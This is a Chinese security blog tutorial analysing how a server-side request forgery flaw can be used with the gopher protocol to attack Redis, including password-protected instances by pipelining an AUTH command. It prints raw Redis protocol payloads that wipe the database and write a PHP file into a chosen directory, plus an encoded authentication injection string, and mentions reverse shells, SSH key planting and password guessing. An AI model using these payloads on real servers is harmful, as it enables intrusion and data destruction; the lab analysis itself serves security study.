# 浅析SSRF认证攻击Redis

阅读量 **546395**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-07-08 16:00:45

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t0144a23463997b871d.png)

前段时间evoA师傅提到了SSRF可以攻击有密码认证的Redis服务，网上的文章大部分都是未授权打Redis，而有关SSRF认证攻击Redis的文章很少，在这里简单分析一下，如有错误还望斧正。

## SSRF

SSRF漏洞的原理是利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务，我们可以用其探测内网信息、攻击内网应用、穿透防火墙、读取任意文件等。  
这里我们演示的是攻击内网Redis应用，类似的还有未授权攻击Mysql服务等。

## SSRF未授权攻击Redis

当存在SSRF漏洞且内网中Redis服务可以未授权访问时，我们可以利用gopher协议构造tcp报文发送一系列请求来攻击Redis服务。

常见的几种攻击方式：

  * 利用计划任务执行命令反弹shell
  * 写ssh-keygen公钥然后使用私钥登陆
  * 往web物理路径写webshell

网上一堆利用文章，这里不再阐述，这里主要分析未授权攻击的数据包。

pull一个redis服务的docker容器

`docker pull ju5ton1y/redis`  
`docker run -d -p 8001:6379 ju5ton1y/redis`

设置未授权

`sed -i 's/requirepass 123123/#requirepass 123123/g' /etc/redis.conf`  
`docker restart id`

进入容器

`apt-get install tcpdump`  
`tcpdump -i eth0 port 6379 -o nopass.pcap`

利用工具生成payload，直接打即可。

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562314359625-a500fbbd-f319-438e-beb2-2f561bdaceb4.png#align=left&display=inline&height=489&name=image.png&originHeight=978&originWidth=2408&size=189674&status=done&width=1204)

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562314418255-6e38d858-2bd1-4a53-906e-abc1f20fc1a7.png#align=left&display=inline&height=666&name=image.png&originHeight=1332&originWidth=2664&size=536764&status=done&width=1332)

通过翻阅官网文档<https://redis.io/topics/protocol>，可以看到Redis使用的是RESP协议

（ps:英语太渣，谷歌翻译可能不太准确，具体可直接看原文。）

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562314691771-a069c437-f0ee-4761-9379-78082dd6d080.png#align=left&display=inline&height=447&name=image.png&originHeight=894&originWidth=1862&size=242003&status=done&width=931)

可以看到客户端将命令发送到Redis服务器的流程为

  * 客户端向Redis服务器发送一个仅由Bulk Strings组成的RESP Arrays。
  * Redis服务器回复发送任何有效RESP数据类型作为回复的客户端。

Bulk Strings用于表示长度最大为512 MB的单个二进制安全字符串，按以下方式编码：

  * 一个`$`字节后跟组成字符串的字节数（一个前缀长度），由CRLF终止。
  * 实际的字符串数据。
  * 最终的CRLF。

字符串`foobar`的编码如下：`$6rnfoobarrn`。

RESP Arrays使用以下格式发送:

  * 一个`*`字符作为第一个字节，后跟数组中的元素数作为十进制数，后跟CRLF。
  * 数组中的每个元素都附加RESP类型。

现在数据包中的每一行数据就好理解了。每一个`*number`代表每一行命令，number代表每行命令中数组中的元素个数。`$number`代表每个元素的长度。

    
    
    *1
    $8
    flushall
    *3
    $3
    set
    $1
    1
    $22
    
    
    <?php phpinfo();?>
    
    
    *4
    $6
    config
    $3
    set
    $3
    dir
    $4
    /tmp
    *4
    $6
    config
    $3
    set
    $10
    dbfilename
    $9
    shell.php
    *1
    $4
    save
    

## SSRF认证攻击Redis

`sed -i 's/#requirepass 123123/requirepass 123123/g' /etc/redis.conf`  
`docker restart id`

进入容器`tcpdump -i eth0 port 6379 -o havepass.pcap`

本地客户端发送命令到容器6379端口

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562316415742-7bffaaa3-2dee-4254-9dd0-ef5ea8859cba.png#align=left&display=inline&height=242&name=image.png&originHeight=484&originWidth=1312&size=102782&status=done&width=656)

随便查看部分tcp流

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562316547267-bdbb5aaa-886a-45cf-8d0e-3b89e99596c0.png#align=left&display=inline&height=571&name=image.png&originHeight=1142&originWidth=2514&size=526678&status=done&width=1257)

可以看到在发送请求之前都发送了下面这条命令用来认证

    
    
    *2
    $4
    AUTH
    $6
    123123
    

在官方文档中提到Redis是`Request-Response model`.  
`A client can use the same connection in order to issue multiple commands.
Pipelining is supported so multiple commands can be sent with a single write
operation by the client, without the need to read the server reply of the
previous command before issuing the next one. All the replies can be read at
the end..`

大致意思是说Redis客户端支持管道操作，
**可以通过单个写入操作发送多个命令，而无需在发出下一个命令之前读取上一个命令的服务器回复。所有的回复都可以在最后阅读** 。

这也是Redis在认证情况下依然可以被攻击到原因。

重新构造数据包，添加`%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A`

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562317306311-248dc667-ea25-4ab9-8d9a-f566d161b9b3.png#align=left&display=inline&height=337&name=image.png&originHeight=674&originWidth=2556&size=127434&status=done&width=1278)

测试

![](https://cdn.nlark.com/yuque/0/2019/png/258679/1562317347405-9c917411-47aa-4f2d-a9c6-f370437c3457.png#align=left&display=inline&height=429&name=image.png&originHeight=858&originWidth=2420&size=373813&status=done&width=1210)

可以看到写入成功

## 后记

在渗透环境中假如找到了SSRF漏洞且内网中开着有认证的Redis服务，我们可以写个脚本用弱口令跑一波SSRF认证攻击Redis，说不定会有突破。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Smi1e** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/181599](/post/id/181599)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [SSRF](/tag/SSRF)
  * [Redis](/tag/Redis)

 **+1** __14赞

 __收藏

![](https://p5.ssl.qhimg.com/t010d9349529890bcdc.png) Smi1e

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

